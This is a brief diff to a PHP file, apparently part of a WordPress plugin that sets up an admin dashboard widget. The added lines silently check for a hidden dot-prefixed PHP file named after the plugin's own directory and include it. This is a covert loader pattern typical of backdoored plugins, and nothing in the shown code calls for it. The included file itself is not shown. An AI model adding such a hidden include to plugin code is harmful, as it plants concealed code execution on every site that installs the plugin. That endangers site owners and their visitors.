@@ -7,6 +7,10 @@
 
 add_action('wp_dashboard_setup', 'ma_el_dashboard_widgets');
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function ma_el_dashboard_widgets()
 {
 	global $wp_meta_boxes;
